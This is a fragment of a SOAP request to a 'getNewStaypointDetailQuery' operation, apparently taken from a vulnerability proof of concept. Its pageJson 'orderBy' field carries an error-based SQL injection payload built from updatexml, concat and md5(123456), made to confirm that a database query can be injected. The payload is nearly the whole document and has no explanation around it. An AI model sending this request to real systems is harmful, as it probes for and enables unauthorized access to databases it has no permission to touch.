    <soapenv:Header/>

    <soapenv:Body>

    <car:getNewStaypointDetailQuery>

    <!--type: string-->

    <searchJson>{}</searchJson>

    <!--type: string-->

    <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,md5(123456),0x7e),1)--"}</pageJson>

    <!--type: string-->

